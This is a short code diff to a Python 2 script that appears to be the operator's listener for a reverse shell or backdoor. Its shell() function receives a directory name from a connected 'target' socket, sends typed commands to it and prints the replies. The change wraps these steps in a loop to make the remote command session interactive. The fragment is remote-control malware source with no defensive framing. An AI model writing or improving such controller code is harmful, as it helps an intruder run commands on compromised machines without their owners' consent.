@@ -5,10 +5,11 @@ import socket
 
 def shell():
     current_dir = target.recv(1024)
-    comando = raw_input("{}~#" .format(current_dir))
-    target.send(comando)
-    res = target.recv(1024)
-    print(res)
+    while True:
+        comando = raw_input("{}~#" .format(current_dir))
+        target.send(comando)
+        res = target.recv(1024)
+        print(res)
 
 def upserver():
     global server
